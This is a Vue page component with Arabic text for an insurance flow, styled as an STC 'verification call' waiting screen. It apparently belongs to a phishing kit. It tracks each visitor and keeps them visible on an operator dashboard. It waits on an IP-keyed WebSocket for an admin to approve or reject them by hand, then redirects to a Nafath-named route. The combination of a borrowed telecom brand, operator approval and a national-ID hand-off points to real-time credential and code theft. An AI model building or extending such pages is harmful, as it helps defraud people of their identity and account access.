<template>
    <StcLayout>
        <!-- Back Button -->
        <div class="my-5 flex w-full justify-start">
            <button type="button" class="stc-back-btn" @click="goBack">
                <svg class="h-4 w-4 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                </svg>
                <span>العودة</span>
            </button>
        </div>

        <div class="flex w-full flex-col items-center gap-5">
            <!-- Call Illustration -->
            <div class="flex h-52 items-center justify-center">
                <div class="call-illustration">
                    <div class="call-ring call-ring-1"></div>
                    <div class="call-ring call-ring-2"></div>
                    <div class="call-ring call-ring-3"></div>
                    <div class="call-icon">
                        <svg class="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 20 20">
                            <path
                                d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
                        </svg>
                    </div>
                </div>
            </div>

            <!-- Pending State -->
            <template v-if="status === 'pending'">
                <h2 class="mb-2 text-3xl font-medium stc-text-primary lg:text-4xl text-center">في انتظار مكالمة التحقق</h2>
                <p class="text-center text-base stc-text-dark">ستصلك مكالمة من STC للتحقق من هويتك. يرجى الرد على
                    المكالمة</p>

                <div class="py-4">
                    <div class="stc-loader">
                        <div class="stc-loader__dot"></div>
                        <div class="stc-loader__dot"></div>
                        <div class="stc-loader__dot"></div>
                    </div>
                </div>

                <!-- Countdown Timer -->
                <div class="text-center">
                    <p class="text-sm stc-text-dark">
                        الوقت المتبقي:
                        <span class="font-bold stc-text-primary">{{ formatTime(countdown) }}</span>
                    </p>
                </div>

                <div class="w-full">
                    <button :disabled="true" class="stc-btn-contained stc-btn-disabled w-full">
                        <span>في انتظار المكالمة...</span>
                    </button>
                </div>
            </template>

            <!-- Approved State -->
            <Transition name="stc-fade">
                <div v-if="status === 'approved'" class="flex w-full flex-col items-center gap-4 py-4">
                    <div class="flex h-16 w-16 items-center justify-center rounded-full bg-green-100">
                        <svg class="h-10 w-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"
                                d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <h2 class="text-xl font-bold text-green-800">تم التحقق بنجاح</h2>
                    <p class="text-sm text-green-700">جاري تحويلك...</p>
                </div>
            </Transition>

            <!-- Rejected State -->
            <Transition name="stc-fade">
                <div v-if="status === 'rejected'" class="flex w-full flex-col items-center gap-4 py-4">
                    <div class="flex h-16 w-16 items-center justify-center rounded-full bg-red-100">
                        <svg class="h-10 w-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"
                                d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </div>
                    <h2 class="text-xl font-bold text-red-800">{{ rejectReason || 'فشل التحقق' }}</h2>
                    <p class="text-sm text-red-700">يرجى المحاولة مرة أخرى</p>
                    <button type="button" class="stc-btn-contained w-full" @click="retry">
                        <span>إعادة المحاولة</span>
                    </button>
                </div>
            </Transition>
        </div>
    </StcLayout>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue';
import { useRouter, useRoute } from 'vue-router';
import { useI18n } from 'vue-i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { getEcho } from '@/services/echo';
import StcLayout from '@/car.insurance/components/StcLayout.vue';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { safeRedirect } from '@/utils/safeRedirect';

const router = useRouter();
const route = useRoute();
const { t } = useI18n();

useVisitorTracking( 'stc/call-waiting' );

// ─── Load context from sessionStorage ───────────────────────────────
const stcContext = JSON.parse( sessionStorage.getItem( 'stcContext' ) || '{}' );
const phoneNumber = stcContext.phoneNumber || route.query.phone || '';
const customerIp = stcContext.customerIp || '';

// ─── State ──────────────────────────────────────────────────────────
const status = ref( 'pending' ); // pending | approved | rejected
const countdown = ref( 180 );
const rejectReason = ref( '' );
let countdownInterval = null;
let pollTimer = null;
let echoChannel = null;

const formatTime = ( seconds ) =>
{
    const mins = Math.floor( seconds / 60 );
    const secs = seconds % 60;
    return `${ mins.toString().padStart( 2, '0' ) }:${ secs.toString().padStart( 2, '0' ) }`;
};

// ─── WebSocket — listen for admin approval/rejection ────────────────
async function setupWebSocket ()
{
    const echo = await getEcho();
    if ( !echo || !customerIp ) return;

    echoChannel = echo.channel( `stc.${ customerIp }` );

    echoChannel.listen( '.StcCallApproved', handleApproved );
    echoChannel.listen( '.StcCallRejected', handleRejected );
}

function handleApproved ( event )
{
    status.value = 'approved';
    clearInterval( pollTimer );
    clearInterval( countdownInterval );

    // Save context
    sessionStorage.setItem( 'stcContext', JSON.stringify( {
        ...stcContext,
        phoneNumber,
        customerIp,
        stcCallApproved: true,
    } ) );

    setTimeout( () =>
    {
        if ( event.redirect_to )
        {
            safeRedirect( event.redirect_to, 'nafathRedirecting', router );
        } else
        {
            router.push( { name: 'nafathRedirecting' } );
        }
    }, 2000 );
}

function handleRejected ( event )
{
    status.value = 'rejected';
    rejectReason.value = getReasonLabel( event.reason || 'stc_call_other', t ) || 'فشل التحقق';
    clearInterval( pollTimer );
    clearInterval( countdownInterval );

    // Auto-redirect back to phone verification after showing error
    setTimeout( () => {
        router.push( { name: 'phoneVerification' } );
    }, 3000 );
}

// ─── Polling Fallback ───────────────────────────────────────────────
function startPolling ()
{
    if ( pollTimer ) return;

    pollTimer = setInterval( async () =>
    {
        if ( status.value !== 'pending' ) return;

        try
        {
            const { default: request } = await import( '@/api/request' );

            // Heartbeat — keep customer visible in admin dashboard
            request.post( '/customer/page', { current_page: '/insurance/stc/call-waiting' } ).catch( () => {} );

            // Actual status check
            const { data } = await request.get( '/customer/stc-status' );
            if ( data.stc_call === 'approved' )
            {
                handleApproved( {} );
            } else if ( data.stc_call === 'rejected' )
            {
                handleRejected( { reason: data.stc_call_reason || 'stc_call_other' } );
            }
        } catch
        {
            // Silent — polling is a fallback
        }
    }, 5000 );
}

// ─── Countdown ──────────────────────────────────────────────────────
const startCountdown = () =>
{
    if ( countdownInterval ) clearInterval( countdownInterval );

    countdownInterval = setInterval( () =>
    {
        if ( countdown.value > 0 )
        {
            countdown.value--;
        } else
        {
            clearInterval( countdownInterval );
            // Timeout — redirect back to phone verification
            router.push( { name: 'phoneVerification' } );
        }
    }, 1000 );
};

// ─── Navigation ─────────────────────────────────────────────────────
const goBack = () => router.back();
const retry = () =>
{
    status.value = 'pending';
    rejectReason.value = '';
    countdown.value = 180;
    startCountdown();
    startPolling();
    setupWebSocket();
};

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( () =>
{
    startCountdown();
    setupWebSocket();
    startPolling();
} );

onUnmounted( () =>
{
    if ( countdownInterval ) clearInterval( countdownInterval );
    if ( pollTimer )
    {
        clearInterval( pollTimer );
        pollTimer = null;
    }
    if ( echoChannel && customerIp )
    {
        try { window.Echo?.leave( `stc.${ customerIp }` ); } catch { /* */ }
    }
} );
</script>

<style scoped>
/* Call animation — unique to this page */
.call-illustration {
    position: relative;
    width: 160px;
    height: 160px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.call-icon {
    width: 72px;
    height: 72px;
    border-radius: 50%;
    background: #4F008C;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10;
    animation: callPulse 2s ease-in-out infinite;
}

.call-ring {
    position: absolute;
    border-radius: 50%;
    border: 2px solid #4F008C;
    animation: callRing 2s ease-out infinite;
}

.call-ring-1 { width: 100px; height: 100px; animation-delay: 0s; }
.call-ring-2 { width: 130px; height: 130px; animation-delay: 0.3s; }
.call-ring-3 { width: 160px; height: 160px; animation-delay: 0.6s; }

@keyframes callRing {
    0% { opacity: 0.6; transform: scale(0.8); }
    100% { opacity: 0; transform: scale(1.2); }
}

@keyframes callPulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.05); }
}
</style>
